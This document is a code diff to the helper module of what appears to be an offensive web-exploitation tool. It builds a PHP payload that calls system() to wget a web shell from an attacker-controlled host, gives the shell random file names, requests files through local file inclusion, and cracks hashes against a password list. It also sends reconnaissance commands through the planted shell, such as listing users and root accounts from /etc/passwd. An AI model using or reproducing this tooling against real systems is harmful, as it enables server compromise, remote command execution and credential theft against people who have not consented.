@@ -1,9 +1,12 @@
 
 import requests
 import random
-import base64
 import hashlib
 from urllib.parse import urljoin , urlparse , urlencode
+
+
+def random_shell_name():
+    return str(random.randint(11111,99999)) + '.php'
 
 def crack_hash(hash):
     for password in open('tools/lists/password.lst').readlines():
@@ -35,13 +38,15 @@ def lfi_request_file(url,cookies,headers,file):
     return requests.get(full_url,cookies=cookies,headers=headers)
 
 def wget_payload(lhost,lport,shell_name):
-    return f"wget http://{lhost}:{str(lport)}/tools/shell.php -O {shell_name}.php"
+    return f"wget http://{lhost}:{str(lport)}/tools/shell.php -O {shell_name}"
 
 def php_payload(lhost,lport,shell_name):
     return f"<?php system('{wget_payload(lhost=lhost,lport=lport,shell_name=shell_name)}'); ?>"
 
 def php_shell():
-    return open('tools/shell.php').read()
+    with open('tools/shell.php') as shellcode:
+        return shellcode.read()
+
 
 def makeHeaders(
     hostname,
@@ -63,7 +68,8 @@ def random_command():
         'uname','uname -a','uname -r','w','who','ps','head -2 /etc/passwd','date',
         'php -r \'echo "Hello World From php l000l *_*";\'','id','cat /etc/resolv.conf',
         'lsmod','cat /proc/cpuinfo','cat /proc/meminfo','cat /proc/meminfo',
-        'for user in $(cat /etc/passwd |cut -f1 -d":"); do id $user; done','cat /etc/passwd |cut -f1,3,4 -d":" |grep "0:0" |cut -f1 -d":" |awk \'{print $1}\''
+        'for user in $(cat /etc/passwd |cut -f1 -d":"); do id $user; done',
+        'cat /etc/passwd |cut -f1,3,4 -d":" |grep "0:0" |cut -f1 -d":" |awk \'{print $1}\''
     ]
 
     return f"whoami ; echo \"|\" ; hostname ; echo \"|\"; pwd ; echo \"|\"; {commands[random.randint(0,len(commands)-1)]}"
@@ -74,16 +80,20 @@ def print_command_output(command,output,end = "\t\t"):
     print(f"{end}{uname.strip().split('</form>')[-1]}@{hname.strip()}:{path.strip()}#{command}")
     print( f"{end}\t" + command_output.replace('\n',f"\n{end}\t").strip())
 
+
 def check_exploit_succeed(shell_path,headers,end = "\t\t"):
     cmd = random_command()
     res = requests.get(shell_path + f"?{urlencode({'cmd' : cmd})}",headers=headers)
+
     if res.status_code == 200:
         print("\t\tExploit Succeed")
         print(f"\t\tShell path : {shell_path}")
-        command = cmd.split(';')[6]
-        if isinstance(command,list):
-            command = ' ; '.join(command)
+        command = cmd.split(';')[6:]
 
+        # if our random command is multiple commands separated by simicolon will be splitted
+        # therefore we must rejoin them
+
+        command = ';'.join(command)
         print_command_output(command,res.text)
 
     else:
